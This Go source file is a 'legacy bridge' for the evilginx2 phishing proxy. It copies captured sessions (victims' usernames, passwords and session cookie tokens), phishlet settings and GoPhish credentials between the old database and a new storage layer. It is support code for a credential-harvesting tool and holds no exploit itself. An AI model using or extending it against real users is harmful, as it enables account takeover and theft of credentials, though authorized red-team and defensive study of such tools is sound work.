package bridge

import (
	"context"
	"fmt"
	"time"

	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/internal/storage"
	"github.com/kgretzky/evilginx2/pkg/models"
)

type LegacyBridge struct {
	config   *core.Config
	database *database.Database
	storage  storage.Interface
}

func NewLegacyBridge(config *core.Config, db *database.Database, storage storage.Interface) *LegacyBridge {
	return &LegacyBridge{
		config:   config,
		database: db,
		storage:  storage,
	}
}

func (b *LegacyBridge) SyncSessionsFromLegacy(ctx context.Context) error {
	legacySessions, err := b.database.ListSessions()
	if err != nil {
		return fmt.Errorf("failed to list legacy sessions: %w", err)
	}

	for _, legacySession := range legacySessions {
		session := b.convertLegacySession(legacySession)
		
		if err := b.storage.CreateSession(ctx, session); err != nil {
			fmt.Printf("Warning: failed to sync session %s: %v\n", session.ID, err)
		}
	}

	return nil
}

func (b *LegacyBridge) SyncSessionsToLegacy(ctx context.Context) error {
	sessions, err := b.storage.ListSessions(ctx, nil)
	if err != nil {
		return fmt.Errorf("failed to list sessions: %w", err)
	}

	for _, session := range sessions {
		legacySession := b.convertToLegacySession(session)
		
		if err := b.database.CreateSession(legacySession.SessionId, legacySession.Phishlet, 
			legacySession.LandingURL, legacySession.UserAgent, legacySession.RemoteAddr); err != nil {
			fmt.Printf("Warning: failed to sync session to legacy: %v\n", err)
		}
	}

	return nil
}

func (b *LegacyBridge) SyncPhishletsFromLegacy(ctx context.Context) error {
	phishletNames := b.config.GetPhishletNames()
	
	for _, name := range phishletNames {
		legacyPhishlet, err := b.config.GetPhishlet(name)
		if err != nil || legacyPhishlet == nil {
			continue
		}
		
		phishlet := b.convertLegacyPhishlet(legacyPhishlet)
		
		if err := b.storage.CreatePhishlet(ctx, phishlet); err != nil {
			fmt.Printf("Warning: failed to sync phishlet %s: %v\n", name, err)
		}
	}

	return nil
}

func (b *LegacyBridge) SyncConfigFromLegacy(ctx context.Context) error {
	config := &models.Config{
		General: models.GeneralConfig{
			Domain:       b.config.GetBaseDomain(),
			ExternalIPv4: b.config.GetServerExternalIP(),
			BindIPv4:     b.config.GetServerBindIP(),
			UnauthURL:    "",
			HttpsPort:    b.config.GetHttpsPort(),
			DnsPort:      b.config.GetDnsPort(),
			Autocert:     b.config.IsAutocertEnabled(),
		},
		Blacklist: models.BlacklistConfig{
			Mode: b.config.GetBlacklistMode(),
		},
		GoPhish: models.GoPhishConfig{
			AdminURL:    b.config.GetGoPhishAdminUrl(),
			ApiKey:      b.config.GetGoPhishApiKey(),
			InsecureTLS: b.config.GetGoPhishInsecureTLS(),
		},
		UpdateTime: time.Now().UTC(),
	}

	return b.storage.UpdateConfig(ctx, config)
}

func (b *LegacyBridge) convertLegacySession(legacySession *database.Session) *models.Session {
	cookieTokens := make(map[string]map[string]*models.CookieToken)
	for domain, tokens := range legacySession.CookieTokens {
		cookieTokens[domain] = make(map[string]*models.CookieToken)
		for name, token := range tokens {
			cookieTokens[domain][name] = &models.CookieToken{
				Name:     token.Name,
				Value:    token.Value,
				Path:     token.Path,
				HttpOnly: token.HttpOnly,
			}
		}
	}

	return &models.Session{
		ID:           legacySession.SessionId,
		Index:        legacySession.Id,
		PhishletName: legacySession.Phishlet,
		LandingURL:   legacySession.LandingURL,
		Username:     legacySession.Username,
		Password:     legacySession.Password,
		Custom:       legacySession.Custom,
		BodyTokens:   legacySession.BodyTokens,
		HttpTokens:   legacySession.HttpTokens,
		CookieTokens: cookieTokens,
		UserAgent:    legacySession.UserAgent,
		RemoteAddr:   legacySession.RemoteAddr,
		CreateTime:   time.Unix(legacySession.CreateTime, 0).UTC(),
		UpdateTime:   time.Unix(legacySession.UpdateTime, 0).UTC(),
		IsActive:     true,
	}
}

func (b *LegacyBridge) convertToLegacySession(session *models.Session) *database.Session {
	cookieTokens := make(map[string]map[string]*database.CookieToken)
	for domain, tokens := range session.CookieTokens {
		cookieTokens[domain] = make(map[string]*database.CookieToken)
		for name, token := range tokens {
			cookieTokens[domain][name] = &database.CookieToken{
				Name:     token.Name,
				Value:    token.Value,
				Path:     token.Path,
				HttpOnly: token.HttpOnly,
			}
		}
	}

	return &database.Session{
		Id:           session.Index,
		Phishlet:     session.PhishletName,
		LandingURL:   session.LandingURL,
		Username:     session.Username,
		Password:     session.Password,
		Custom:       session.Custom,
		BodyTokens:   session.BodyTokens,
		HttpTokens:   session.HttpTokens,
		CookieTokens: cookieTokens,
		SessionId:    session.ID,
		UserAgent:    session.UserAgent,
		RemoteAddr:   session.RemoteAddr,
		CreateTime:   session.CreateTime.Unix(),
		UpdateTime:   session.UpdateTime.Unix(),
	}
}

func (b *LegacyBridge) convertLegacyPhishlet(legacyPhishlet *core.Phishlet) *models.Phishlet {
	proxyHosts := make([]models.ProxyHost, 0)
	
	hostname, _ := b.config.GetSiteDomain(legacyPhishlet.Name)
	unauthURL, _ := b.config.GetSiteUnauthUrl(legacyPhishlet.Name)
	
	return &models.Phishlet{
		ID:           legacyPhishlet.Name,
		Name:         legacyPhishlet.Name,
		DisplayName:  legacyPhishlet.Name,
		Author:       legacyPhishlet.Author,
		Version:      "1.0.0",
		RedirectURL:  legacyPhishlet.RedirectUrl,
		ProxyHosts:   proxyHosts,
		IsTemplate:   false,
		IsEnabled:    b.config.IsSiteEnabled(legacyPhishlet.Name),
		IsVisible:    !b.config.IsSiteHidden(legacyPhishlet.Name),
		Hostname:     hostname,
		UnauthURL:    unauthURL,
		CreateTime:   time.Now().UTC(),
		UpdateTime:   time.Now().UTC(),
	}
}

func (b *LegacyBridge) GetNextSessionIndex() (int, error) {
	sessions, err := b.storage.ListSessions(context.Background(), nil)
	if err != nil {
		return 1, err
	}

	maxIndex := 0
	for _, session := range sessions {
		if session.Index > maxIndex {
			maxIndex = session.Index
		}
	}

	return maxIndex + 1, nil
}

func (b *LegacyBridge) CreateSessionFromLegacy(sessionId, phishlet, landingUrl, userAgent, remoteAddr string) (*models.Session, error) {
	index, err := b.GetNextSessionIndex()
	if err != nil {
		return nil, err
	}

	session := &models.Session{
		ID:           sessionId,
		Index:        index,
		PhishletName: phishlet,
		LandingURL:   landingUrl,
		UserAgent:    userAgent,
		RemoteAddr:   remoteAddr,
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*models.CookieToken),
		CreateTime:   time.Now().UTC(),
		UpdateTime:   time.Now().UTC(),
		IsActive:     true,
	}

	if err := b.storage.CreateSession(context.Background(), session); err != nil {
		return nil, err
	}

	return session, nil
}
